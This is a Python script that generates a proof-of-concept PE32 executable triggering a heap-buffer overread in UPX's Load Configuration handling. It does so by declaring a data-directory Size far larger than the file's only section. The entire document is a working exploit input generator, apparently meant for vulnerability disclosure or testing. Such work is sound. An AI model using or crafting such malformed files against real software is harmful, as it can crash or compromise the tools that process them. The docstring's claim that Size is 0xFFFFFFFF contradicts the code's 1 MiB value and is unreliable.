#!/usr/bin/env python3
"""Generate PoC for upx-pe-loadconf-overflow.

Builds a syntactically valid PE32 (i386) image with a single .text
section and a Load Configuration data directory entry whose Size field
is huge (0xFFFFFFFF). UPX's PE32 handler trusts this Size when copying
loadconf data, causing heap-buffer-overflow when it reads
[loadconf_offset .. loadconf_offset + Size] from the file image.
"""
import struct


def create_poc(output='poc.bin'):
    # Layout (all offsets in file image):
    #   0x00 - 0x3F  DOS header (MZ + 60-byte pad + e_lfanew=0x40)
    #   0x40 - 0x4F  PE signature + COFF header (24 bytes incl. signature)
    #   0x58 - ...   Optional header (224 bytes: standard + Windows + 16 DataDir)
    #   ...          Section table (40 bytes per section)
    #   ...          Sections data, including a Load Configuration table

    image_base = 0x400000
    file_align = 0x200
    sect_align = 0x1000
    text_rva  = 0x1000
    text_size = 0x4000
    # Put Load Config inside .text for simplicity
    loadconf_rva  = 0x1000
    # Picking a size below UPX_RSIZE_MAX (~32 MiB) but larger than what
    # actually exists in the file image — UPX reads past the section end.
    loadconf_size = 0x100000   # 1 MiB — much bigger than the 16 KiB section

    dos = b'MZ' + b'\x00' * 58 + struct.pack('<I', 0x40)
    assert len(dos) == 0x40

    pe_sig = b'PE\x00\x00'
    # COFF: machine(2)+numsect(2)+timestamp(4)+symtab(4)+nsyms(4)+optsz(2)+chars(2)
    coff = struct.pack('<HHIIIHH',
        0x14c,             # i386
        1,                 # number of sections
        0,                 # timestamp
        0,                 # ptr to symbol table
        0,                 # number of symbols
        224,               # size of optional header
        0x102,             # characteristics: EXECUTABLE_IMAGE | 32BIT_MACHINE
    )

    # Optional header (PE32). Standard (28) + Windows (68) + 16 DataDirs (128) = 224.
    standard = struct.pack('<HBBIIIIII',
        0x10b,    # PE32 magic
        14, 0,    # major/minor linker
        text_size,    # size of code
        0,            # size of init data
        0,            # size of uninit data
        text_rva,     # entry point
        text_rva,     # base of code
        0,            # base of data (PE32 only)
    )
    windows = struct.pack('<IIIHHHHHHIIIIHHIIIIII',
        image_base,         # ImageBase
        sect_align,         # SectionAlignment
        file_align,         # FileAlignment
        4, 0,               # major/minor OS
        0, 0,               # major/minor image
        4, 0,               # major/minor subsystem (NT 4.0)
        0,                  # Win32 version
        0x10000,  # SizeOfImage (must be > headers + sections; UPX rejects tiny ones)
        0x400,              # SizeOfHeaders (must be > headers, < first sect rva)
        0,                  # Checksum
        3,                  # Subsystem = IMAGE_SUBSYSTEM_WINDOWS_CUI
        0,                  # DllCharacteristics
        0x100000,           # SizeOfStackReserve
        0x1000,             # SizeOfStackCommit
        0x100000,           # SizeOfHeapReserve
        0x1000,             # SizeOfHeapCommit
        0,                  # LoaderFlags
        16,                 # NumberOfRvaAndSizes
    )

    # 16 data directories: only Load Config (index 10) is populated.
    dirs = b''
    for i in range(16):
        if i == 10:
            dirs += struct.pack('<II', loadconf_rva, loadconf_size)
        else:
            dirs += struct.pack('<II', 0, 0)
    optional = standard + windows + dirs
    assert len(optional) == 224, len(optional)

    # Section table: one section '.text'
    sect_table = struct.pack('<8sIIIIIIHHI',
        b'.text\x00\x00\x00',
        text_size,        # VirtualSize
        text_rva,         # VirtualAddress
        text_size,        # SizeOfRawData
        file_align,       # PointerToRawData (file offset of section data)
        0, 0, 0, 0,
        0x60000020,       # CODE | EXECUTE | READ
    )

    # Assemble headers; pad to first section's PointerToRawData (file_align).
    headers = dos + pe_sig + coff + optional + sect_table
    pad = file_align - len(headers)
    if pad < 0:
        raise SystemExit("headers don't fit before file_align")
    headers += b'\x00' * pad

    # Section data: .text contents (text_size bytes); first dword acts as the
    # "Load Configuration table" header (size). We don't need real fields —
    # UPX trusts the DataDirectory's Size and reads past the section end.
    text_bytes = b'\x90' * text_size  # NOPs

    blob = headers + text_bytes
    with open(output, 'wb') as f:
        f.write(blob)
    print(f"wrote {output} ({len(blob)} bytes)")


if __name__ == '__main__':
    create_poc()
